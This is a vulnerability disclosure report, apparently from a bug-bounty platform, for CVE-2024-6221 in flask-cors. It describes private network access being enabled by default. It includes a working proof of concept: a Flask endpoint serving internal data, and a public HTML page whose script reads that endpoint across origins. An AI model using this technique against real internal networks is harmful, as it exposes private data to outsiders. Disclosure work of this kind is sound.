@@ -1,0 +1,77 @@
+Title: Private Network Permission Enabled by default in corydolphin/flask-cors
+
+Proof of Concept: 
+// Host this in your local network.
+from flask import Flask, jsonify
+import logging
+try:
+    # The typical way to import flask-cors
+    from flask_cors import cross_origin
+except ImportError:
+    # Path hack allows examples to be run without installation.
+    import os
+    parentdir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    os.sys.path.insert(0, parentdir)
+
+    from flask_cors import cross_origin
+
+
+app = Flask('FlaskCorsViewBasedExample')
+logging.basicConfig(level=logging.INFO)
+
+
+@app.route("/SecretInformationFromPrivateNetwork", methods=['GET'])
+@cross_origin()
+def secretStuff():
+    return "Super Secret Confidential stuff"
+
+
+
+if __name__ == "__main__":
+    app.run(debug=True)
+
+// Host this in a public network
+<html>
+    <head>
+        <title>TrustedSec CORS POC</title>
+    </head>
+    <body>
+        <h1>TrustedSec CORS POC</h>
+        <script>
+var xhr = new XMLHttpRequest();
+var url = 'http://<PrivateNetwork>/SecretInformationFromPrivateNetwork'; 
+
+xhr.open('GET', url, true);
+xhr.onreadystatechange = function() {
+    if (xhr.readyState === 4 && xhr.status === 200) {
+        console.log(xhr.responseText);
+    }
+};
+xhr.send();
+
+
+        </script>
+    </body>
+</html>
+
+Impact: 
+The vulnerability in the Flask CORS plugin, where Access-Control-Allow-Private-Network is always set to true, exposes private network resources to unauthorized external access. This can lead to data breaches, unauthorized access to sensitive information, and potential network intrusions, significantly increasing the security risks for internal systems.
+
+CVE ID: CVE-2024-6221
+Status: (published)
+Vulnerability Type: CWE-284: Improper Access Control
+Severity: Medium (6.5)
+Attack Vector: Network
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: Required
+Scope: Unchanged
+Confidentiality: High
+Integrity: None
+Availability: None
+Registry: Pypi
+Affected Version: 4.0.1
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $125
+Fix Bounty: $31.25
